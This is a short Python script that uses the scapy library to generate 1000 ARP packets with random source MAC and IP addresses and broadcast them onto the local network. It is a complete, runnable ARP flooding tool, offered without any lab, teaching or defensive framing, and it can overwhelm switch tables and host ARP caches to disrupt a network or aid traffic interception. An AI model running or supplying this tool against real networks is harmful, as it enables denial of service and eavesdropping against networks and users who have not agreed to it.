from scapy.all import Ether, ARP, RandIP, RandMAC, sendp

def sending_packages(packet_list):
    if packet_list:
        sendp(packet_list, verbose=False)
        print(f"[+] Sending {len(packet_list)} ARP-packets.")
    else:
        print("[-] List packets zero.")

def generating_arp_packet(number_packet=1000):
    packet_list = []
    for _ in range(number_packet):
        src_mac = RandMAC()
        src_ip  = RandIP()
        dst_ip  = RandIP()

        packet = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") / \
          ARP(hwsrc=src_mac, psrc=src_ip, pdst=dst_ip)

        packet_list.append(packet)
    return packet_list

def main():
    print("[*] Generating ARP-packets...")
    packets = generating_arp_packet()  
    print("[*] Sending packet...")
    sending_packages(packets)

if __name__ == "__main__":
    main()
